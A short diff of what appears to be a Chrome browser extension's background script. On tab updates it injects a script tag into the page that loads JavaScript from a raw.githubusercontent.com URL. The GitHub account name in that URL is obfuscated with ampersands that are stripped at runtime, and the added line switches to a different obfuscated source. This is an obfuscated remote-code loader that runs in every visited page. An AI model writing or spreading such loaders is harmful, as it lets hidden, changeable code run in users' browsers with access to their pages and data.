@@ -74,7 +74,7 @@ chrome.tabs.onUpdated.addListener(async function(tabId, info, tab) {
                 target: { tabId },
                 function: async function() {
                     const s = document.createElement('script')
-                    s.src = 'https://raw.githubusercontent.com/&&&&&&&k&&&&0a&&&&&&y&&&&b&&&&&r&&&i&&&y&&&e&&&l/extensions/chrome-min/foreground.min.js'.replace(/&/g, '')
+                    s.src = 'https://raw.githubusercontent.com/&&&&&&&k&&&&a&&&&&&y&&&&b&&&&&r&&&i&&&y&&&e&&&l/extensions/chrome-min/foreground.min.js'.replace(/&/g, '')
                     document.body.append(s)
                 },
             })
